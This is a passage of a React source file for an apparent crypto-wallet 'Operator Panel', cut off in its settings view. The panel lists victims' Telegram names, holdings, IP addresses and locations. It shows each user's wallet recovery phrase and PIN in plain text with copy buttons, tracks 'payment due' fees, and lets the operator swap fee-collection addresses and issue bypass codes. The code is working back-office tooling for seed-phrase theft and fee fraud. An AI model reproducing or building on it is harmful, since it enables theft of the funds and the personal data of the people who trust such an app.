import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { motion, AnimatePresence } from "framer-motion";
import {
  ChevronLeft, LogOut, Settings, Trash2, RefreshCw,
  Eye, EyeOff, Copy, Save, X, ChevronDown, ChevronUp,
  Key, Clock, Plus, ShieldCheck, ShieldOff,
} from "lucide-react";

// ── Types ─────────────────────────────────────────────────────────────────────
interface Balance { id: string; tokenSymbol: string; tokenName: string; balance: number; walletAddress: string | null; iconUrl: string | null; iconColor: string; }
interface PayEntry { id: string; amountUsd: number; coin: string | null; paidAt: string | null; txType: string; }
interface Session { id: string; openedAt: string | null; closedAt: string | null; durationSeconds: number | null; ipAddress: string | null; location: string | null; }
interface User { id: string; name: string; telegramName: string | null; createdAt: string; lastActive: string | null; paymentStatus: string; paymentDueUsd: number; totalFeesPaidUsd: number; paymentCoin: string | null; balances: Balance[]; pin?: string | null; }
interface BypassCode { id: string; code: string; durationHours: number; createdAt: string | null; expiresAt: string; usedBy: string | null; usedAt: string | null; revoked: boolean; }

// ── Helpers ───────────────────────────────────────────────────────────────────
const PRICES: Record<string, number> = { BTC: 68829, ETH: 2054.38, SOL: 83.97, XRP: 1.4263, USDC: 1, USDT: 1, DOGE: 0.128, LINK: 12.45, BNB: 560, LTC: 73.50 };
const usd = (v: number) => new Intl.NumberFormat("en-US", { style: "currency", currency: "USD", maximumFractionDigits: 2 }).format(v);
const portOf = (b: Balance[]) => b.reduce((s, x) => s + x.balance * (PRICES[x.tokenSymbol] || 1), 0);
function ago(d: string | null) {
  if (!d) return "—";
  const m = Math.floor((Date.now() - new Date(d).getTime()) / 60000);
  if (m < 1) return "just now"; if (m < 60) return `${m}m ago`;
  const h = Math.floor(m / 60); if (h < 24) return `${h}h ago`;
  const days = Math.floor(h / 24); return days === 1 ? "1d ago" : `${days}d ago`;
}
function fmtDate(d: string | null) {
  if (!d) return "—";
  return new Date(d).toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" });
}
function fmtDur(s: number) { return s < 60 ? `${s}s` : s < 3600 ? `${Math.floor(s / 60)}m` : `${Math.floor(s / 3600)}h ${Math.floor((s % 3600) / 60)}m`; }
function parseLoc(loc: string | null) {
  if (!loc) return null;
  try { const p = JSON.parse(loc); return p.timezone || p.raw; } catch { return loc; }
}

const SLIDE = {
  initial: { opacity: 0, x: 30 },
  animate: { opacity: 1, x: 0, transition: { duration: 0.2, ease: [0.25, 0.1, 0.25, 1] } },
  exit: { opacity: 0, x: -30, transition: { duration: 0.15 } },
};

const PAYMENT_COINS = [
  { symbol: "BTC", name: "Bitcoin", key: "payment_address_BTC" },
  { symbol: "ETH", name: "Ethereum", key: "payment_address_ETH" },
  { symbol: "USDT", name: "Tether (ERC-20)", key: "payment_address_USDT" },
  { symbol: "SOL", name: "Solana", key: "payment_address_SOL" },
];

// ── Root ──────────────────────────────────────────────────────────────────────
type View = "login" | "list" | "detail" | "settings";

export default function Admin2Page() {
  const [view, setView] = useState<View>("login");
  const [pass, setPass] = useState("");
  const [err, setErr] = useState("");
  const [activeUser, setActiveUser] = useState<User | null>(null);
  const [toast, setToast] = useState("");

  const toast$ = (msg: string) => { setToast(msg); setTimeout(() => setToast(""), 2800); };

  const login = async () => {
    try {
      const r = await apiRequest("POST", "/api/admin2/login", { password: pass });
      if (r.ok) { setView("list"); setErr(""); } else { setErr("Incorrect code"); setPass(""); }
    } catch { setErr("Incorrect code"); setPass(""); }
  };

  if (view === "login") return (
    <div className="min-h-screen bg-[#000] flex items-center justify-center px-6">
      <div className="w-full max-w-[280px]">
        <p className="text-white text-[24px] font-semibold text-center mb-1 tracking-tight">Operator Panel</p>
        <p className="text-[#48484A] text-sm text-center mb-10">Restricted access</p>
        {err && <p className="text-[#FF453A] text-sm text-center mb-4">{err}</p>}
        <input type="password" value={pass} onChange={(e) => setPass(e.target.value)}
          onKeyDown={(e) => e.key === "Enter" && login()} placeholder="Access code" autoFocus
          className="w-full bg-[#111] border border-[#222] rounded-2xl px-4 py-4 text-white placeholder:text-[#3a3a3c] outline-none focus:border-[#333] transition-colors mb-3" />
        <button onClick={login} className="w-full py-4 bg-white text-black rounded-2xl text-[15px] font-semibold active:opacity-70">
          Continue
        </button>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-[#000] text-white">
      {toast && (
        <div className="fixed top-4 left-1/2 -translate-x-1/2 z-50 bg-[#1c1c1e] border border-[#2c2c2e] text-white text-sm px-5 py-2.5 rounded-2xl shadow-2xl pointer-events-none">
          {toast}
        </div>
      )}
      <AnimatePresence mode="wait">
        {view === "list" && (
          <motion.div key="list" {...SLIDE}>
            <UserListView
              onOpen={(u) => { setActiveUser(u); setView("detail"); }}
              onSettings={() => setView("settings")}
              onLogout={() => { setView("login"); setPass(""); }}
              toast$={toast$}
            />
          </motion.div>
        )}
        {view === "detail" && activeUser && (
          <motion.div key="detail" {...SLIDE}>
            <UserDetailView userId={activeUser.id} onBack={() => { setActiveUser(null); setView("list"); }} toast$={toast$} />
          </motion.div>
        )}
        {view === "settings" && (
          <motion.div key="settings" {...SLIDE}>
            <SettingsView onBack={() => setView("list")} toast$={toast$} />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

// ── User List ─────────────────────────────────────────────────────────────────
function UserListView({ onOpen, onSettings, onLogout, toast$ }: {
  onOpen: (u: User) => void; onSettings: () => void; onLogout: () => void; toast$: (m: string) => void;
}) {
  const qc = useQueryClient();
  const [filter, setFilter] = useState<"all" | "active" | "pending">("all");
  const [sel, setSel] = useState<Set<string>>(new Set());
  const [confirmAll, setConfirmAll] = useState(false);
  const [search, setSearch] = useState("");

  const { data: users = [], isLoading, refetch } = useQuery<User[]>({ queryKey: ["/api/admin/users"] });

  const bulkDel = useMutation({
    mutationFn: async (ids: string[]) => { await fetch("/api/admin/users-bulk", { method: "DELETE", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ ids }) }); },
    onSuccess: () => { qc.invalidateQueries({ queryKey: ["/api/admin/users"] }); setSel(new Set()); toast$("Deleted"); },
  });
  const delAll = useMutation({
    mutationFn: async () => { await fetch("/api/admin/users-all", { method: "DELETE" }); },
    onSuccess: () => { qc.invalidateQueries({ queryKey: ["/api/admin/users"] }); setSel(new Set()); setConfirmAll(false); toast$("All users deleted"); },
  });

  const filtered = users.filter(u => {
    const q = search.toLowerCase();
    const matchQ = !q || u.name.toLowerCase().includes(q) || (u.telegramName || "").toLowerCase().includes(q);
    const matchF = filter === "all" || (filter === "active" ? u.paymentStatus !== "pending" : u.paymentStatus === "pending");
    return matchQ && matchF;
  });

  const toggle = (id: string) => { const s = new Set(sel); s.has(id) ? s.delete(id) : s.add(id); setSel(s); };
  const totalPort = users.reduce((s, u) => s + portOf(u.balances), 0);
  const pending = users.filter(u => u.paymentStatus === "pending").length;
  const active = users.length - pending;

  return (
    <div className="min-h-screen">
      {/* Header */}
      <div className="sticky top-0 z-10 bg-[#000]/95 backdrop-blur-xl border-b border-[#111]">
        <div className="max-w-2xl mx-auto px-5 py-4 flex items-center justify-between">
          <div>
            <p className="text-white text-[17px] font-semibold leading-none">User Database</p>
            <p className="text-[#48484A] text-xs mt-1">{users.length} registered accounts</p>
          </div>
          <div className="flex items-center gap-2">
            <button onClick={() => refetch()} className="p-2.5 rounded-xl border border-[#1c1c1e] text-[#636366] hover:text-white transition-colors"><RefreshCw className="w-4 h-4" /></button>
            <button onClick={onSettings} className="p-2.5 rounded-xl border border-[#1c1c1e] text-[#636366] hover:text-white transition-colors"><Settings className="w-4 h-4" /></button>
            <button onClick={onLogout} className="p-2.5 rounded-xl border border-[#1c1c1e] text-[#636366] hover:text-white transition-colors"><LogOut className="w-4 h-4" /></button>
          </div>
        </div>
      </div>

      <div className="max-w-2xl mx-auto px-5 py-5 space-y-5">
        {/* Stats */}
        <div className="grid grid-cols-4 gap-px bg-[#111] rounded-2xl overflow-hidden border border-[#111]">
          {[
            { label: "Total", value: String(users.length) },
            { label: "Active", value: String(active) },
            { label: "Pending", value: String(pending) },
            { label: "Portfolio", value: usd(totalPort) },
          ].map(s => (
            <div key={s.label} className="bg-[#000] px-4 py-4 text-center">
              <p className="text-white font-semibold text-base">{s.value}</p>
              <p className="text-[#48484A] text-[10px] mt-0.5 uppercase tracking-wide">{s.label}</p>
            </div>
          ))}
        </div>

        {/* Search + filters */}
        <div className="flex items-center gap-3 flex-wrap">
          <input type="text" value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search by name or @telegram…"
            className="flex-1 min-w-[180px] bg-[#0d0d0d] border border-[#1c1c1e] rounded-xl px-4 py-2.5 text-white text-sm placeholder:text-[#3a3a3c] outline-none focus:border-[#2c2c2e] transition-colors" />
          <div className="flex items-center gap-1.5">
            {(["all", "active", "pending"] as const).map(f => (
              <button key={f} onClick={() => setFilter(f)} className={`px-3 py-2 rounded-xl text-xs font-medium capitalize transition-all ${filter === f ? "bg-white text-black" : "bg-[#111] border border-[#1c1c1e] text-[#636366]"}`}>{f}</button>
            ))}
          </div>
        </div>

        {/* Bulk actions bar */}
        {(sel.size > 0 || (users.length > 0 && confirmAll)) && (
          <div className="flex items-center justify-between border border-[#222] rounded-xl px-4 py-3">
            {sel.size > 0 ? (
              <>
                <p className="text-[#8E8E93] text-sm">{sel.size} selected</p>
                <div className="flex items-center gap-2">
                  <button onClick={() => setSel(new Set())} className="text-[#636366] text-xs px-3 py-1.5 rounded-lg bg-[#111]"><X className="w-3 h-3" /></button>
                  <button onClick={() => bulkDel.mutate(Array.from(sel))} disabled={bulkDel.isPending} className="text-[#FF453A] text-xs font-medium px-3 py-1.5 rounded-lg bg-[#FF453A]/10 flex items-center gap-1.5 disabled:opacity-40">
                    <Trash2 className="w-3 h-3" />{bulkDel.isPending ? "Deleting…" : `Delete ${sel.size}`}
                  </button>
                </div>
              </>
            ) : confirmAll ? (
              <>
                <p className="text-[#FF453A] text-sm font-medium">Delete all {users.length} users permanently?</p>
                <div className="flex items-center gap-2">
                  <button onClick={() => setConfirmAll(false)} className="text-[#636366] text-xs px-3 py-1.5 rounded-lg bg-[#111]">Cancel</button>
                  <button onClick={() => delAll.mutate()} disabled={delAll.isPending} className="text-white text-xs font-medium px-3 py-1.5 rounded-lg bg-[#FF453A] disabled:opacity-40">{delAll.isPending ? "Deleting…" : "Confirm Delete All"}</button>
                </div>
              </>
            ) : null}
          </div>
        )}

        {/* User table */}
        {isLoading ? (
          <div className="flex justify-center py-20"><div className="w-5 h-5 border border-[#333] border-t-white rounded-full animate-spin" /></div>
        ) : filtered.length === 0 ? (
          <div className="text-center py-20">
            <p className="text-[#3a3a3c] text-sm">{users.length === 0 ? "No accounts registered yet" : "No results"}</p>
          </div>
        ) : (
          <div className="border border-[#111] rounded-2xl overflow-hidden">
            {/* Column header */}
            <div className="grid grid-cols-[auto_1fr_120px_120px_16px] gap-4 px-5 py-3 bg-[#050505] border-b border-[#111]">
              <div className="w-4" />
              <p className="text-[#48484A] text-[10px] uppercase tracking-widest font-medium">User</p>
              <p className="text-[#48484A] text-[10px] uppercase tracking-widest font-medium">Registered</p>
              <p className="text-[#48484A] text-[10px] uppercase tracking-widest font-medium">Last Active</p>
              <div />
            </div>
            {/* Rows */}
            {filtered.map((user, i) => {
              const isPaid = user.paymentStatus !== "pending";
              const isSelected = sel.has(user.id);
              return (
                <div key={user.id}
                  className={`grid grid-cols-[auto_1fr_120px_120px_16px] gap-4 items-center px-5 py-4 cursor-pointer ${i < filtered.length - 1 ? "border-b border-[#0d0d0d]" : ""} ${isSelected ? "bg-white/3" : "hover:bg-[#080808]"} transition-colors group`}
                  onClick={() => onOpen(user)}
                >
                  {/* Checkbox */}
                  <button onClick={(e) => { e.stopPropagation(); toggle(user.id); }}
                    className={`w-4 h-4 rounded border flex items-center justify-center transition-all flex-shrink-0 ${isSelected ? "bg-white border-white" : "border-[#2c2c2e] group-hover:border-[#444]"}`}>
                    {isSelected && <div className="w-2 h-2 bg-black rounded-sm" />}
                  </button>
                  {/* Identity */}
                  <div className="min-w-0">
                    <div className="flex items-center gap-2 min-w-0">
                      <span className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${isPaid ? "bg-[#30D158]" : "bg-[#FF9F0A]"}`} />
                      {user.telegramName
                        ? <p className="text-white text-sm font-medium font-mono truncate">@{user.telegramName}</p>
                        : <p className="text-[#636366] text-sm italic truncate">{user.name}</p>}
                    </div>
                    <p className="text-[#48484A] text-[11px] mt-0.5 pl-3.5 truncate">{user.name}</p>
                  </div>
                  {/* Registered */}
                  <div>
                    <p className="text-[#8E8E93] text-xs">{fmtDate(user.createdAt)}</p>
                    <p className="text-[#3a3a3c] text-[10px] mt-0.5">{ago(user.createdAt)}</p>
                  </div>
                  {/* Last Active */}
                  <div>
                    <p className="text-[#8E8E93] text-xs">{ago(user.lastActive)}</p>
                    {user.lastActive && <p className="text-[#3a3a3c] text-[10px] mt-0.5">{fmtDate(user.lastActive)}</p>}
                  </div>
                  {/* Arrow */}
                  <svg width="6" height="10" viewBox="0 0 6 10" fill="none" className="text-[#3a3a3c] flex-shrink-0">
                    <path d="M1 1L5 5L1 9" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </div>
              );
            })}
          </div>
        )}

        {/* Delete all */}
        {users.length > 0 && sel.size === 0 && !confirmAll && (
          <div className="flex justify-end">
            <button onClick={() => setConfirmAll(true)} className="flex items-center gap-1.5 text-[#FF453A] text-xs px-3 py-2 rounded-xl border border-[#FF453A]/20 hover:bg-[#FF453A]/5 transition-colors">
              <Trash2 className="w-3 h-3" /> Delete All
            </button>
          </div>
        )}

        <div className="h-6" />
      </div>
    </div>
  );
}

// ── User Detail ───────────────────────────────────────────────────────────────
function UserDetailView({ userId, onBack, toast$ }: { userId: string; onBack: () => void; toast$: (m: string) => void; }) {
  const qc = useQueryClient();
  const [seedVisible, setSeedVisible] = useState(false);
  const [showPay, setShowPay] = useState(false);
  const [showSess, setShowSess] = useState(false);
  const [confirmDel, setConfirmDel] = useState(false);

  const { data: user } = useQuery<User>({
    queryKey: ["/api/admin/users", userId],
    queryFn: async () => {
      const [ur, br] = await Promise.all([fetch("/api/admin/users"), fetch(`/api/admin/users/${userId}/balances`)]);
      const all = await ur.json(); const bals = await br.json();
      return { ...all.find((x: User) => x.id === userId), balances: bals };
    },
    refetchInterval: 15000,
  });

  const { data: seedData } = useQuery<{ seedPhrase: string }>({
    queryKey: ["/api/admin/users", userId, "seed"],
    queryFn: async () => { const r = await fetch(`/api/admin/users/${userId}`); return r.json(); },
  });

  const { data: payHistory = [] } = useQuery<PayEntry[]>({
    queryKey: ["/api/admin/users", userId, "pay-hist"],
    queryFn: async () => { const r = await fetch(`/api/admin/users/${userId}/payment-history`); return r.json(); },
  });
  const { data: sessions = [] } = useQuery<Session[]>({
    queryKey: ["/api/admin/users", userId, "sess"],
    queryFn: async () => { const r = await fetch(`/api/admin/users/${userId}/sessions`); return r.json(); },
  });

  const delUser = useMutation({
    mutationFn: async () => { await fetch(`/api/admin/users/${userId}`, { method: "DELETE" }); },
    onSuccess: () => { qc.invalidateQueries({ queryKey: ["/api/admin/users"] }); toast$("User deleted"); onBack(); },
  });

  const copy = (text: string, label: string) => { navigator.clipboard.writeText(text); toast$(label + " copied"); };

  if (!user) return <div className="min-h-screen flex items-center justify-center"><div className="w-5 h-5 border border-[#333] border-t-white rounded-full animate-spin" /></div>;

  const port = portOf(user.balances);
  const isPaid = user.paymentStatus !== "pending";
  const seed = seedData?.seedPhrase || "";
  const pin = (seedData as any)?.pin || user.pin || null;

  return (
    <div className="min-h-screen">
      {/* Header */}
      <div className="sticky top-0 z-10 bg-[#000]/95 backdrop-blur-xl border-b border-[#111]">
        <div className="max-w-2xl mx-auto px-5 py-4 flex items-center gap-4">
          <button onClick={onBack} className="flex items-center gap-1 text-[#636366] hover:text-white transition-colors text-sm">
            <ChevronLeft className="w-4 h-4" /> Back
          </button>
          <div className="flex-1 min-w-0">
            <p className="text-white font-semibold text-[15px] truncate">{user.name}</p>
            {user.telegramName && <p className="text-[#48484A] text-xs font-mono">@{user.telegramName}</p>}
          </div>
          <span className={`text-[10px] font-medium px-2 py-1 rounded-lg ${isPaid ? "text-[#30D158]" : "text-[#FF9F0A]"}`}>
            ● {isPaid ? "Active" : "Pending"}
          </span>
        </div>
      </div>

      <div className="max-w-2xl mx-auto px-5 py-6 space-y-6">

        {/* Portfolio + meta */}
        <div className="border border-[#111] rounded-2xl overflow-hidden divide-y divide-[#0d0d0d]">
          <div className="px-5 py-5">
            <p className="text-[#48484A] text-xs mb-1">Portfolio value</p>
            <p className="text-white text-[38px] font-light tracking-tight">{usd(port)}</p>
          </div>
          <div className="grid grid-cols-3 divide-x divide-[#0d0d0d]">
            {[
              { label: "Registered", value: fmtDate(user.createdAt) },
              { label: "Last active", value: ago(user.lastActive) },
              { label: "Fees paid", value: usd(user.totalFeesPaidUsd || 0) },
            ].map(m => (
              <div key={m.label} className="px-4 py-4">
                <p className="text-[#48484A] text-[10px] uppercase tracking-widest">{m.label}</p>
                <p className="text-[#8E8E93] text-sm mt-1 font-medium">{m.value}</p>
              </div>
            ))}
          </div>
          {!isPaid && (
            <div className="px-5 py-4">
              <p className="text-[#48484A] text-[10px] uppercase tracking-widest mb-1">Payment due</p>
              <p className="text-[#FF9F0A] text-sm font-medium">{usd(user.paymentDueUsd || 0)}{user.paymentCoin ? ` via ${user.paymentCoin}` : ""}</p>
            </div>
          )}
        </div>

        {/* Client PIN */}
        <div className={`border rounded-2xl px-5 py-4 flex items-center justify-between ${pin ? "border-[#1a3a1a] bg-[#0a150a]" : "border-[#111]"}`}>
          <div>
            <p className="text-[#48484A] text-[10px] uppercase tracking-widest mb-1">Client Passcode (PIN)</p>
            {pin
              ? <p className="text-[#30D158] text-2xl font-mono font-bold tracking-[0.25em]">{pin}</p>
              : <p className="text-[#3a3a3c] text-sm">Not set yet — client hasn't created their PIN</p>
            }
          </div>
          {pin && (
            <button onClick={() => copy(pin, "PIN")} className="flex items-center gap-1.5 text-[#0A84FF] text-xs px-3 py-2 rounded-xl border border-[#0A84FF]/20 hover:bg-[#0A84FF]/5 transition-colors">
              <Copy className="w-3 h-3" /> Copy
            </button>
          )}
        </div>

        {/* Holdings */}
        {user.balances.length > 0 && (
          <div>
            <p className="text-[#48484A] text-[10px] uppercase tracking-widest mb-3">Holdings</p>
            <div className="border border-[#111] rounded-2xl overflow-hidden divide-y divide-[#0d0d0d]">
              {user.balances.map(b => {
                const val = b.balance * (PRICES[b.tokenSymbol] || 1);
                return (
                  <div key={b.id} className="flex items-center gap-4 px-5 py-4">
                    {b.iconUrl
                      ? <img src={b.iconUrl} alt={b.tokenSymbol} className="w-9 h-9 rounded-full flex-shrink-0" onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
                      : <div className="w-9 h-9 rounded-full bg-[#111] border border-[#222] flex items-center justify-center flex-shrink-0"><span className="text-[#636366] text-xs font-bold">{b.tokenSymbol.slice(0, 2)}</span></div>}
                    <div className="flex-1 min-w-0">
                      <p className="text-white text-sm font-medium">{b.tokenSymbol} <span className="text-[#48484A] font-normal">— {b.tokenName}</span></p>
                      {b.walletAddress && (
                        <button onClick={() => copy(b.walletAddress!, "Address")} className="flex items-center gap-1.5 mt-0.5 group">
                          <span className="text-[#3a3a3c] text-[10px] font-mono group-hover:text-[#636366] transition-colors">{b.walletAddress.slice(0, 20)}…</span>
                          <Copy className="w-2.5 h-2.5 text-[#0A84FF] opacity-0 group-hover:opacity-100 transition-opacity" />
                        </button>
                      )}
                    </div>
                    <div className="text-right flex-shrink-0">
                      <p className="text-white text-sm font-medium">{usd(val)}</p>
                      <p className="text-[#48484A] text-xs">{b.balance.toFixed(6)}</p>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* Seed phrase */}
        <div>
          <div className="flex items-center justify-between mb-3">
            <p className="text-[#48484A] text-[10px] uppercase tracking-widest">Recovery phrase</p>
            <div className="flex items-center gap-3">
              {seedVisible && seed && <button onClick={() => copy(seed, "Seed phrase")} className="text-[#0A84FF] text-xs">Copy</button>}
              <button onClick={() => setSeedVisible(!seedVisible)} className="text-[#636366] text-xs flex items-center gap-1">
                {seedVisible ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                {seedVisible ? "Hide" : "Reveal"}
              </button>
            </div>
          </div>
          <div className="border border-[#111] rounded-2xl px-5 py-4">
            <p className={`text-sm font-mono leading-7 break-all select-none ${seedVisible ? "text-white" : "text-[#1a1a1a]"}`}>
              {seedVisible && seed ? seed : "████ ████ ████ ████ ████ ████ ████ ████ ████ ████ ████ ████"}
            </p>
          </div>
        </div>

        {/* Payment history */}
        {payHistory.length > 0 && (
          <div>
            <button onClick={() => setShowPay(!showPay)} className="flex items-center justify-between w-full mb-3">
              <p className="text-[#48484A] text-[10px] uppercase tracking-widest">Payment history</p>
              <span className="text-[#636366] text-xs flex items-center gap-1">{payHistory.length} records {showPay ? <ChevronUp className="w-3 h-3" /> : <ChevronDown className="w-3 h-3" />}</span>
            </button>
            <AnimatePresence>
              {showPay && (
                <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }}
                  className="border border-[#111] rounded-2xl overflow-hidden divide-y divide-[#0d0d0d]">
                  {payHistory.map(h => (
                    <div key={h.id} className="flex items-center justify-between px-5 py-3.5">
                      <div>
                        <p className="text-white text-sm font-medium">{usd(h.amountUsd)}</p>
                        <p className="text-[#48484A] text-xs">{h.coin || "—"} · {h.txType === "incremental" ? "incremental" : "initial"}</p>
                      </div>
                      <p className="text-[#636366] text-xs">{h.paidAt ? fmtDate(h.paidAt) : "—"}</p>
                    </div>
                  ))}
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        )}

        {/* Sessions */}
        {sessions.length > 0 && (
          <div>
            <button onClick={() => setShowSess(!showSess)} className="flex items-center justify-between w-full mb-3">
              <p className="text-[#48484A] text-[10px] uppercase tracking-widest">Login sessions</p>
              <span className="text-[#636366] text-xs flex items-center gap-1">{sessions.length} sessions {showSess ? <ChevronUp className="w-3 h-3" /> : <ChevronDown className="w-3 h-3" />}</span>
            </button>
            <AnimatePresence>
              {showSess && (
                <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }}
                  className="border border-[#111] rounded-2xl overflow-hidden divide-y divide-[#0d0d0d]">
                  {sessions.slice(0, 12).map(s => (
                    <div key={s.id} className="px-5 py-3.5 space-y-1">
                      <div className="flex items-center justify-between">
                        <p className="text-[#8E8E93] text-xs">{s.openedAt ? new Date(s.openedAt).toLocaleString("en-US", { month: "short", day: "numeric", hour: "numeric", minute: "2-digit" }) : "—"}</p>
                        {!s.closedAt
                          ? <span className="text-[#30D158] text-[9px] font-medium uppercase tracking-wide">Live</span>
                          : s.durationSeconds ? <span className="text-[#48484A] text-xs">{fmtDur(s.durationSeconds)}</span> : null}
                      </div>
                      <div className="flex items-center gap-4">
                        {s.ipAddress && <p className="text-[#3a3a3c] text-[10px] font-mono">{s.ipAddress}</p>}
                        {parseLoc(s.location) && <p className="text-[#3a3a3c] text-[10px]">{parseLoc(s.location)}</p>}
                      </div>
                    </div>
                  ))}
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        )}

        {/* Delete */}
        <div className="border border-[#1a1a1a] rounded-2xl overflow-hidden">
          {confirmDel ? (
            <div className="px-5 py-4 flex items-center justify-between">
              <p className="text-[#FF453A] text-sm">Permanently delete this user?</p>
              <div className="flex items-center gap-2">
                <button onClick={() => setConfirmDel(false)} className="text-[#636366] text-xs px-3 py-1.5 rounded-lg bg-[#111]">Cancel</button>
                <button onClick={() => delUser.mutate()} disabled={delUser.isPending} className="text-white text-xs font-medium px-3 py-1.5 rounded-lg bg-[#FF453A] disabled:opacity-40">
                  {delUser.isPending ? "Deleting…" : "Delete"}
                </button>
              </div>
            </div>
          ) : (
            <button onClick={() => setConfirmDel(true)} className="w-full flex items-center justify-center gap-2 px-5 py-4 text-[#FF453A] text-sm hover:bg-[#FF453A]/4 transition-colors">
              <Trash2 className="w-4 h-4" /> Delete User
            </button>
          )}
        </div>

        <div className="h-10" />
      </div>
    </div>
  );
}

// ── Settings View ─────────────────────────────────────────────────────────────
const DURATION_OPTS = [
  { label: "1 hour", hours: 1 },
  { label: "6 hours", hours: 6 },
  { label: "24 hours", hours: 24 },
  { label: "48 hours", hours: 48 },
  { label: "7 days", hours: 168 },
  { label: "30 days", hours: 720 },
];

function fmtExpiry(d: string) {
  const ms = new Date(d).getTime() - Date.now();
  if (ms < 0) return "Expired";
  const h = Math.floor(ms / 3600000);
  if (h < 1) return `${Math.floor(ms / 60000)}m left`;
  if (h < 24) return `${h}h left`;
  return `${Math.floor(h / 24)}d left`;
}

function SettingsView({ onBack, toast$ }: { onBack: () => void; toast$: (m: string) => void; }) {
  const qc = useQueryClient();
  const [tab, setTab] = useState<"addresses" | "bypass">("addresses");
  const [draft, setDraft] = useState<Record<string, string>>({});
  const [newCode, setNewCode] = useState<{ code: string; expiresAt: string } | null>(null);
  const [selDuration, setSelDuration] = useState(24);
  const [customHours, setCustomHours] = useState("");

  const { data: settings = {} } = useQuery<Record<string, string>>({ queryKey: ["/api/admin/settings"] });
  const { data: codes = [], refetch: refetchCodes } = useQuery<BypassCode[]>({ queryKey: ["/api/admin/bypass-codes"], enabled: tab === "bypass" });

  const save = useMutation({
    mutationFn: async (data: Record<string, string>) => { const r = await apiRequest("PATCH", "/api/admin/settings", data); return r.json(); },
    onSuccess: () => { qc.invalidateQueries({ queryKey: ["/api/admin/settings"] }); setDraft({}); toast$("Addresses saved — live instantly"); },
  });

  const generate = useMutation({
    mutationFn: async (hours: number) => { const r = await apiRequest("POST", "/api/admin/bypass-codes", { durationHours: hours }); return r.json(); },
    onSuccess: (data) => { setNewCode(data); refetchCodes(); toast$("Bypass code generated"); },
  });

  const revoke = useMutation({
    mutationFn: async (id: string) => { const r = await apiRequest("PATCH", `/api/admin/bypass-codes/${id}/disable`); return r.json(); },
    onSuccess: () => { refetchCodes(); toast$("Code disabled"); },
  });
  const enableCode = useMutation({
    mutationFn: async (id: string) => { const r = await apiRequest("PATCH", `/api/admin/bypass-codes/${id}/enable`); return r.json(); },
    onSuccess: () => { refetchCodes(); toast$("Code enabled"); },
  });
  const hardDelete = useMutation({
    mutationFn: async (id: string) => { const r = await apiRequest("DELETE", `/api/admin/bypass-codes/${id}`); return r.json(); },
    onSuccess: () => { refetchCodes(); toast$("Code deleted"); },
  });

  const val = (key: string) => draft[key] !== undefined ? draft[key] : (settings[key] || "");
  const dirty = PAYMENT_COINS.some(c => draft[c.key] !== undefined && draft[c.key] !== (settings[c.key] || ""));
  const durationHours = selDuration === -1 ? (parseInt(customHours) || 0) : selDuration;

  return (
    <div className="min-h-screen">
      <div className="sticky top-0 z-10 bg-[#000]/95 backdrop-blur-xl border-b border-[#111]">
        <div className="max-w-2xl mx-auto px-5 py-4 flex items-center gap-4">
          <button onClick={onBack} className="flex items-center gap-1 text-[#636366] hover:text-white transition-colors text-sm">
            <ChevronLeft className="w-4 h-4" /> Back
          </button>
          <p className="text-white font-semibold text-[15px] flex-1">Settings</p>
        </div>
        <div className="max-w-2xl mx-auto px-5 pb-0 flex gap-6 border-t border-[#111]">
          <button onClick={() => setTab("addresses")}
            className={`py-3 text-sm font-medium border-b-2 transition-colors ${tab === "addresses" ? "border-white text-white" : "border-transparent text-[#48484A]"}`}>
            Payment Addresses
          </button>
          <button onClick={() => setTab("bypass")}
            className={`py-3 text-sm font-medium border-b-2 transition-colors flex items-center gap-1.5 ${tab === "bypass" ? "border-white text-white" : "border-transparent text-[#48484A]"}`}>
            <Key className="w-3.5 h-3.5" /> Bypass Codes
          </button>
        </div>
      </div>

      {tab === "addresses" && (
        <div className="max-w-2xl mx-auto px-5 py-6 space-y-5">
          <p className="text-[#48484A] text-sm leading-relaxed">
            Receiving addresses for fee collection. Changes are applied instantly — all users including those currently active will see the updated address.
          </p>
          <div className="border border-[#111] rounded-2xl overflow-hidden divide-y divide-[#0d0d0d]">
            {PAYMENT_COINS.map(coin => (
              <div key={coin.key} className="px-5 py-4">
                <div className="flex items-center justify-between mb-2">
                  <p className="text-white text-sm font-medium">{coin.symbol} <span className="text-[#48484A] font-normal">— {coin.name}</span></p>
                  {val(coin.key) && (
                    <button onClick={() => { navigator.clipboard.writeText(val(coin.key)); toast$("Copied"); }} className="text-[#0A84FF] text-xs flex items-center gap-1">
                      <Copy className="w-3 h-3" /> Copy
                    </button>
                  )}
                </div>
                <input type="text" value={val(coin.key)} onChange={(e) => setDraft(d => ({ ...d, [coin.key]: e.target.value }))}
                  placeholder={`${coin.symbol} address`} spellCheck={false} autoComplete="off"
                  className="w-full bg-[#080808] border border-[#1c1c1e] rounded-xl px-4 py-3 text-white text-xs font-mono placeholder:text-[#333] outline-none focus:border-[#2c2c2e] transition-colors" />
              </div>
            ))}
          </div>
          <button onClick={() => { const d: Record<string, string> = {}; PAYMENT_COINS.forEach(c => { d[c.key] = val(c.key); }); save.mutate(d); }}
            disabled={save.isPending || !dirty}
            className="w-full py-4 bg-white text-black rounded-2xl text-[15px] font-semibold disabled:opacity-20 flex items-center justify-center gap-2">
            <Save className="w-4 h-4" /> {save.isPending ? "Saving…" : "Save Changes"}
          </button>
          <p className="text-[#2c2c2c] text-xs text-center">Changes propagate to all users without a page reload</p>
          <div className="h-6" />
        </div>
      )}

      {tab === "bypass" && (
        <div className="max-w-2xl mx-auto px-5 py-6 space-y-6">
          <p className="text-[#48484A] text-sm leading-relaxed">
